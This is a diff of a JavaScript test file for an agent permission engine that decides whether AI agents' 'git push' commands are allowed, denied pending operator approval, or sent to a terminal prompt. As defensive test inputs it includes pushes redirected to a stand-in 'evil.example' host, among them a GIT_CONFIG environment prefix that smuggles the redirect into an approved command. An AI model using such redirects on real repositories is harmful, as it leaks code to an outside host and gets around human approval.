@@ -181,19 +181,47 @@ test('grantable is validated at load', () => {
   }
 });
 
-test('live: no grant asks; a grant allows exactly that push, logged with its id', () => {
+// A grant is used on a LATER call, so it can never answer a terminal prompt that is
+// already open (day job, 2026-10-06: Approve in ASK ME, agent still stuck at the
+// prompt). An approvable push with no grant is therefore DENIED with an "approval
+// needed" verdict, so no prompt opens; the agent retries after Approve. Only what no
+// grant could ever cover keeps the terminal prompt.
+test('live: an approvable push with no grant is denied as approval-needed; a grant allows exactly it', () => {
   const { e, rows, grants } = engine([PUSH_RULE]);
-  assert.equal(e.evaluate(pre(PUSH)).decision, 'ask');
+  const first = e.evaluate(pre(PUSH));
+  assert.equal(first.decision, 'deny', 'not ask: an ask opens a prompt no grant can answer');
+  assert.equal(first.approvalNeeded, true);
+  assert.equal(rows.at(-1).decision, 'deny');
   const g = grants.mint(request());
   const v = e.evaluate(pre(PUSH));
   assert.equal(v.decision, 'allow');
   assert.equal(v.grantId, g.id);
   assert.equal(rows.at(-1).grant_id, g.id);
-  assert.equal(e.evaluate(pre(`git push origin ${SHA2}:refs/heads/feat/x`)).decision, 'ask', 'the sha moved');
-  assert.equal(e.evaluate(pre(PUSH, 'pam')).decision, 'ask', 'another agent');
-  assert.equal(e.evaluate(pre(`git push evil ${SHA}:refs/heads/feat/x`)).decision, 'ask', 'a re-pointed remote');
-  assert.equal(e.evaluate(pre(`git push --force origin ${SHA}:refs/heads/feat/x`)).decision, 'ask');
-  assert.equal(e.evaluate(pre(`git commit --amend --no-edit && ${PUSH}`)).decision, 'ask', 'amend-and-push in one call');
+  for (const [cmd, agent, why] of [
+    [`git push origin ${SHA2}:refs/heads/feat/x`, 'jim', 'the sha moved'],
+    [PUSH, 'pam', 'another agent'],
+    [`git push evil ${SHA}:refs/heads/feat/x`, 'jim', 'a re-pointed remote'],
+  ]) {
+    const x = e.evaluate(pre(cmd, agent));
+    assert.equal(x.decision, 'deny', why);
+    assert.equal(x.approvalNeeded, true, why);
+  }
+  for (const [cmd, why] of [
+    [`git push --force origin ${SHA}:refs/heads/feat/x`, 'force is never grantable'],
+    [`git commit --amend --no-edit && ${PUSH}`, 'amend-and-push in one call'],
+    ['git push origin main', 'not the approvable form'],
+  ]) {
+    const x = e.evaluate(pre(cmd));
+    assert.equal(x.decision, 'ask', `${why}: the operator answers in the terminal`);
+    assert.equal(x.approvalNeeded, undefined, why);
+  }
+});
+
+test('live: an ask rule that is not grantable still asks', () => {
+  const { e } = engine([{ ...PUSH_RULE, grantable: undefined }]);
+  const v = e.evaluate(pre(PUSH));
+  assert.equal(v.decision, 'ask');
+  assert.equal(v.approvalNeeded, undefined);
 });
 
 test('live: a grant for the good URL is not used when the repo pushes elsewhere', (t) => {
@@ -206,7 +234,10 @@ test('live: a grant for the good URL is not used when the repo pushes elsewhere'
   const grants = new GrantStore(path.join(root, 'policy', 'grants.jsonl'));
   grants.mint(request('jim', { class: 'git-push', target: { remote_url: 'https://github.com/good/repo.git', ref: 'refs/heads/feat/x', sha: SHA }, summary: '' }));
   execFileSync('git', ['-C', dir, 'config', 'remote.origin.pushurl', 'https://evil.example/x.git']);
-  assert.equal(e.evaluate(pre(PUSH, 'jim', dir)).decision, 'ask', 'pushurl');
+  const redirected = e.evaluate(pre(PUSH, 'jim', dir));
+  assert.equal(redirected.decision, 'deny', 'pushurl: the grant is not used');
+  assert.equal(redirected.grantId, undefined);
+  assert.equal(redirected.approvalNeeded, true, 'a fresh card would name the real (evil) URL');
   execFileSync('git', ['-C', dir, 'config', '--unset', 'remote.origin.pushurl']);
   assert.equal(e.evaluate(pre(`GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl GIT_CONFIG_VALUE_0=https://evil.example/x.git ${PUSH}`, 'jim', dir)).decision, 'ask', 'env prefix');
   assert.equal(e.evaluate(pre(PUSH, 'jim', dir)).decision, 'allow', 'the approved push itself still goes');
@@ -299,6 +330,61 @@ test('on: request, pending, Approve, grant message, and the engine allows exactl
   assert.equal(e.evaluate(pre(PUSH, 'jim-1', origin)).decision, 'allow');
   assert.equal(e.evaluate(pre(PUSH, 'jim-1', origin)).decision, 'allow', 'the identical retry');
   assert.match(f.log(), /"kind":"grant-decided"[^\n]*"approved":true/);
+});
+
+function gitRepo(t) {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'md-grant-repo-'));
+  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
+  require('node:child_process').execFileSync('git', ['init', '-q', dir]);
+  require('node:child_process').execFileSync('git', ['-C', dir, 'remote', 'add', 'origin', URL]);
+  return dir;
+}
+const hook = (f, command, cwd) => f.server.handle({
+  agent_id: 'jim-1', session_id: 's1', hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command }, cwd,
+});
+const decisionOf = (out) => out?.hookSpecificOutput?.permissionDecision ?? 'allow';
+
+test('on: a push with no grant is denied, raises its own Approvals card once, and runs after Approve', async (t) => {
+  const origin = gitRepo(t);
+  const f = await floor(t, { version: 1, rules: [PUSH_RULE] });
+  assert.match(f.prompt, /refused with a request id[^.]*\. End your turn/, 'the agent knows a refusal is the card, not a failure');
+  assert.doesNotMatch(f.prompt, /without approval stops at a prompt/);
+  const out = await hook(f, PUSH, origin);
+  assert.equal(decisionOf(out), 'deny', 'no terminal prompt: a grant could never answer it');
+  const [p] = f.server.pendingGrants();
+  assert.ok(p, 'the deny raised the Approvals card');
+  assert.equal(p.command, PUSH);
+  const why = out.hookSpecificOutput.permissionDecisionReason;
+  assert.match(why, new RegExp(p.id), 'the agent is told which request');
+  assert.match(why, /Approved/);
+  assert.match(why, /same command/);
+  assert.equal(f.server.awaitingPolicyAnswer('jim-1'), false, 'no prompt, so no prompt hold and no prompt card');
+  assert.ok(f.inbox('god-1').some((m) => /waiting on the operator/.test(m.subject)));
+  assert.equal(decisionOf(await hook(f, PUSH, origin)), 'deny', 'a retry before Approve');
+  assert.equal(f.server.pendingGrants().length, 1, 'a retry adds no second card');
+  assert.equal(f.server.decideGrant(p.id, true).ok, true);
+  assert.equal(decisionOf(await hook(f, PUSH, origin)), 'allow', 'the retry after Approve runs');
+  assert.match(f.log(), /"kind":"grant-requested"[^\n]*"via":"hook"/);
+});
+
+test('on: an approval-request sent first is the card; the push before Approve adds no second one', async (t) => {
+  const origin = gitRepo(t);
+  const f = await floor(t, { version: 1, rules: [PUSH_RULE] });
+  f.drop({ ...REQUEST, cwd: origin });
+  const [p] = f.server.pendingGrants();
+  const out = await hook(f, PUSH, origin);
+  assert.equal(decisionOf(out), 'deny');
+  assert.match(out.hookSpecificOutput.permissionDecisionReason, new RegExp(p.id));
+  assert.equal(f.server.pendingGrants().length, 1);
+});
+
+test('on: a push no grant can cover still opens the terminal prompt', async (t) => {
+  const origin = gitRepo(t);
+  const f = await floor(t, { version: 1, rules: [PUSH_RULE] });
+  const out = await hook(f, 'git push --force origin main', origin);
+  assert.equal(decisionOf(out), 'ask');
+  assert.equal(f.server.awaitingPolicyAnswer('jim-1'), true);
+  assert.deepEqual(f.server.pendingGrants(), []);
 });
 
 test('on: a request that cannot be granted is refused with the reason, and nothing is pending', async (t) => {
